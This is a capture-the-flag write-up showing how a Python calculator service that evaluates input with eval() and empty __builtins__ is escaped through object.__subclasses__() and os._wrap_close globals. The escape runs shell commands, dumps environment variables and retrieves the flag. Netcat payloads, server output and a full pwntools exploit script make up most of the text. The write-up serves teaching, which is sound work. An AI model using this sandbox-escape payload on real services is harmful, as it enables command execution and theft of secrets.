When I connected to the calculator service at 212.2.250.33:30968, I was greeted with a simple prompt. The challenge description said "I just launched a calculator service via netcat :D. Surely it is secure, right?" That "surely it is secure" part immediately made me suspicious - in CTF language, that's basically screaming "this is vulnerable!"

I started by testing basic math to understand what I was dealing with:

```bash
echo "1+1" | nc 212.2.250.33 30968
```

Response:
```
> Analysis Result: 2
>>
```

It evaluated the expression and returned 2. The phrase "Analysis Result" and the Python-like behavior made me think this was using Python's `eval()` function under the hood.

I tried the most obvious Python RCE vector - using `__import__` to load the os module:

```bash
echo "__import__('os').system('id')" | nc 212.2.250.33 30968
```

Response:
```
> Syntax Error: name '__import__' is not defined
>>
```

Blocked! So `__import__` isn't available. I checked if `__builtins__` was accessible:

```bash
echo "__builtins__" | nc 212.2.250.33 30968
```

Response:
```
> Analysis Result: {}
>>
```

There it was - `__builtins__` was an empty dictionary `{}`. This is the classic Python sandbox pattern where developers pass `{"__builtins__": {}}` as the globals to `eval()`, thinking it strips all dangerous built-in functions. The server-side code probably looked like:

```python
result = eval(user_input, {"__builtins__": {}})
```

But here's the thing - even with `__builtins__` stripped, Python's object model is still intact. Every object in Python inherits from `object`, and I can use `object.__subclasses__()` to get all currently loaded classes in the interpreter. Some of those classes will have references to `os`, `sys`, and other useful modules in their `__globals__`.

I tested this theory by getting all subclasses:

```bash
echo "().__class__.__base__.__subclasses__()" | nc 212.2.250.33 30968
```

This returned a huge list of classes including things like `<class 'type'>`, `<class 'weakref'>`, and importantly, `<class 'os._wrap_close'>`.

The chain works like this:
- `()` - empty tuple object
- `.__class__` - gets `<class 'tuple'>`
- `.__base__` - gets `<class 'object'>` (the base of all classes)
- `.__subclasses__()` - returns list of ALL classes that inherit from object

Now I needed to find a class whose `__init__.__globals__` still holds a reference to the `os` module. The `os._wrap_close` class is perfect because it's defined inside the `os` module itself (it wraps `os.popen` return values), so its `__init__.__globals__` is literally the `os` module's global namespace - which contains `os.system`.

I needed to find the index of `os._wrap_close` in the subclasses list. I tried index 135 (a common index for this class):

```bash
echo "().__class__.__base__.__subclasses__()[135]" | nc 212.2.250.33 30968
```

Response:
```
> Analysis Result: <class 'os._wrap_close'>
>>
```

Perfect! Now I could achieve RCE by accessing `os.system` through this class's globals:

```bash
echo "().__class__.__base__.__subclasses__()[135].__init__.__globals__['system']('id')" | nc 212.2.250.33 30968
```

Response:
```
> uid=999(ctf) gid=999(ctf) groups=999(ctf)
Analysis Result: 0
>>
```

RCE confirmed! I was running as user `ctf` inside a container. Now I needed to find the flag. I listed the `/app` directory:

```bash
echo "().__class__.__base__.__subclasses__()[135].__init__.__globals__['system']('ls /app')" | nc 212.2.250.33 30968
```

Response:
```
> flag.txt
main.py
Analysis Result: 0
>>
```

There was a `flag.txt` file! I tried reading it:

```bash
echo "().__class__.__base__.__subclasses__()[135].__init__.__globals__['system']('cat /app/flag.txt')" | nc 212.2.250.33 30968
```

Response:
```
> The flag is an environment variable :)
Analysis Result: 0
>>
```

Classic CTF troll! The flag wasn't in the file - it was in an environment variable. I dumped all environment variables:

```bash
echo "().__class__.__base__.__subclasses__()[135].__init__.__globals__['system']('env')" | nc 212.2.250.33 30968
```

The response included:
```
FLAG=Kaal{SYST3M_3p1l0gu3_28f788b3}
```

The vulnerability was in how the calculator service used `eval()` with stripped `__builtins__`. While the developer thought removing built-in functions would create a secure sandbox, Python's object model still provided a path to dangerous functionality. By accessing `os._wrap_close.__init__.__globals__`, I could reach the `os` module's namespace and call `os.system` to execute arbitrary commands.

Here's the complete exploit:

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST = '212.2.250.33'
PORT = 30968

io = remote(HOST, PORT)
io.recvuntil(b'>', timeout=2)

# Execute env command to get flag
payload = b"().__class__.__base__.__subclasses__()[135].__init__.__globals__['system']('env')"
io.sendline(payload)
time.sleep(1)
response = io.recvall(timeout=2).decode()

# Extract flag
flag = re.search(r'(Kaal\{[^}]+\})', response)
if flag:
    print(f"[+] FLAG: {flag.group(1)}")

io.close()
```

Flag: Kaal{SYST3M_3p1l0gu3_28f788b3}

Team Exploit4
